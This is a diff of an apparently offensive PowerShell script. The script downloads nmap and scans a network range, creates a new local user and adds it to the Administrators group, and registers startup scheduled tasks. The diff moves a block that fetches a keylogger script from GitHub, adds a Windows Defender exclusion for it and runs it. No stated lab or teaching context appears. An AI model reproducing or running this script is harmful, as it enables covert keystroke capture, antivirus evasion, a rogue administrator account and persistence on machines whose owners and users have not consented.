@@ -10,12 +10,6 @@ Invoke-WebRequest https://nmap.org/dist/nmap-7.93-setup.exe -OutFile "C:\Users\s
 cd C:\Users\setup
 cmd.exe /c nmap-7.93-setup.exe
 cmd.exe /c nmap -T4 -A -v ($nethost + "." + $firstip + "-" + $lastip) -oN netscan
-Invoke-WebRequest https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1 -OutFile "C:\Users\setup\keylogger.ps1"
-Start-Sleep -s 30
-Add-MpPreference -ExclusionPath "C:\Users\setup\keylogger.ps1"
-New-Item "C:\temp\" -itemType Directory
-cd C:\Users\setup
-./keylogger.ps1
 $password = Read-Host -Prompt "Enter the password of your new user: " -AsSecureString
 New-LocalUser -Name "newuser" -AccountNeverExpires -Password $password
 Add-LocalGroupMember -Group "Administrators" -Member "newuser"
@@ -26,3 +20,9 @@ $trigger1 = New-JobTrigger -AtStartup -RandomDelay "00:30:00"
 $trigger2 = New-JobTrigger -AtStartup
 Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName "task1"
 Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName "task2"
+Invoke-WebRequest https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1 -OutFile "C:\Users\setup\keylogger.ps1"
+Start-Sleep -s 30
+Add-MpPreference -ExclusionPath "C:\Users\setup\keylogger.ps1"
+New-Item "C:\temp\" -itemType Directory
+cd C:\Users\setup
+./keylogger.ps1
